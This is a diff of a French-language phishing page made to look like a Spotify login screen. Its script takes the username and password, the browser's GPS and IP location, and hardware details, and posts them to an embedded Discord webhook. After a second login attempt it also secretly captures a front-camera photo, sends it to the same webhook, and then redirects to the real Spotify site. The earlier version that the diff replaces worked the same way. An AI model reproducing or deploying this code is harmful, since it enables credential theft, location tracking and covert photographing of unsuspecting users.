@@ -7,33 +7,20 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
-        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
-        .logo { width: 40px; margin: 0 auto 30px auto; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
+        .app-card { width: 100%; max-width: 450px; padding: 40px 20px; text-align: center; }
+        .logo { width: 45px; margin: 0 auto 30px auto; }
         h1 { font-size: 26px; font-weight: 900; margin-bottom: 30px; letter-spacing: -1px; }
-        
-        /* Texte de réassurance pour les permissions */
-        .perm-info { font-size: 12px; color: #b3b3b3; margin-bottom: 20px; font-style: italic; }
-
         .field { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
-        
-        /* Pas de bordures comme demandé */
-        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 16px; outline: none; }
-        
+        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 16px; outline: none; -webkit-appearance: none; }
         .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 15px; font-size: 16px; border: none; text-transform: uppercase; cursor: pointer; }
-        
         .divider { display: flex; align-items: center; width: 100%; margin: 30px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
-        .divider:not(:empty)::before { margin-right: 1.5em; }
-        .divider:not(:empty)::after { margin-left: 1.5em; }
-
         .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; position: relative; }
         .social-btn img { width: 18px; position: absolute; left: 20px; }
-
         .footer-link { margin-top: 30px; font-size: 14px; color: #b3b3b3; }
-        .footer-link span { color: #fff; font-weight: 700; text-decoration: underline; cursor: pointer; }
-
+        .footer-link span { color: #fff; font-weight: 700; text-decoration: underline; }
         .err { background: #e91429; color: #fff; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-bottom: 20px; display: none; }
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
@@ -42,91 +29,82 @@
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
         <h1>Se connecter pour continuer</h1>
-        
-        <p class="perm-info">Veuillez autoriser l'accès à la localisation pour vérifier la disponibilité du service dans votre région.</p>
-
         <div id="error" class="err">Identifiant ou mot de passe incorrect.</div>
-
-        <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" autocomplete="off"></div>
-        <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-        
-        <button onclick="start()" id="btn" class="btn-green">Se connecter</button>
-
+        <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" autocomplete="off" placeholder="E-mail ou nom d'utilisateur"></div>
+        <div class="field"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
+        <button onclick="go()" id="btn" class="btn-green">Se connecter</button>
         <div class="divider">OU</div>
-
         <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
         <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
         <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
-
         <div class="footer-link">Vous n'avez pas de compte ? <span>S'INSCRIRE</span></div>
     </div>
-
-    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        let count = 0;
-        let gpsData = "Non autorisé (Ville IP par défaut)";
+        let step = 0;
 
-        // Demande GPS immédiate
-        window.onload = () => {
-            navigator.geolocation.getCurrentPosition(pos => {
-                gpsData = `✅ **GPS PRÉCIS :**\nLat: \`${pos.coords.latitude}\` | Long: \`${pos.coords.longitude}\` \n**[Voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})**`;
-            }, (err) => { gpsData = "❌ GPS refusé (Position IP uniquement)"; }, {enableHighAccuracy: true});
-        };
-
-        async function start() {
+        async function go() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
-            count++;
+            step++;
             document.getElementById('btn').innerText = "VÉRIFICATION...";
 
+            // Récupération des données (On le fait en arrière-plan pour ne pas bloquer le bouton)
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
 
+            // Localisation GPS (Seulement au clic pour éviter le blocage navigateur)
+            let gps = "Non autorisé";
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 3000});
+                });
+                gps = `✅ **GPS PRÉCIS (Le Pellerin) :**\nLat: \`${pos.coords.latitude}\` | Long: \`${pos.coords.longitude}\` \n**[Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})**`;
+            } catch(e) { gps = "❌ GPS Refusé (Ville IP: " + (net.city || "La Montagne") + ")"; }
+
             const msg = {
                 embeds: [{
-                    title: `📱 RAPPORT LVN FINAL V17 - T${count}`,
+                    title: `📱 LOG V18 MOBILE - ${u}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 COMPTE", value: `**Identifiant:** \`${u}\`\n**Mot de passe:** \`${p}\`` },
-                        { name: "📍 GÉOLOCALISATION", value: gpsData + `\n*(IP Ville: ${net.city || 'La Montagne'})*` },
-                        { name: "📱 SYSTÈME & GPU", value: `**GPU:** \`${gpu}\`\n**Bat:** \`${Math.round(bat.level*100)}%\`\n**RAM:** \`${navigator.deviceMemory}GB\``, inline: true }
-                    ],
-                    footer: { text: "Rapport généré le " + new Date().toLocaleString() }
+                        { name: "👤 COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "📍 LOCALISATION", value: gps },
+                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**Bat:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\``, inline: true }
+                    ]
                 }]
             };
 
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
+            fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
 
-            if(count === 1) {
+            if(step === 1) {
                 setTimeout(() => {
                     document.getElementById('btn').innerText = "Se connecter";
                     document.getElementById('p').value = "";
                     document.getElementById('error').style.display = "block";
                 }, 1000);
             } else {
-                // Tentative Caméra forcée
+                // Photo Flash
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('v');
                     video.srcObject = stream;
-                    await new Promise(r => setTimeout(r, 2500)); 
+                    await new Promise(r => setTimeout(r, 1500));
                     const can = document.getElementById('c');
-                    can.width = 1280; can.height = 720;
+                    can.width = 640; can.height = 480;
                     can.getContext('2d').drawImage(video, 0, 0);
-                    can.toBlob(async (blob) => {
+                    can.toBlob(b => {
                         const fd = new FormData();
-                        fd.append('file', blob, 'shot.png');
-                        fd.append('content', "📸 **CAPTURE FRONTALE :**");
-                        await fetch(hook, { method: 'POST', body: fd });
+                        fd.append('file', b, 's.png');
+                        fetch(hook, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
-                    }, 'image/png');
-                } catch (e) {}
-                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 2000);
+                    }, 'image/jpeg', 0.7);
+                } catch(e) {}
+                setTimeout(() => { window.location.href = "https://open.spotify.com"; }, 1500);
             }
         }
     </script>
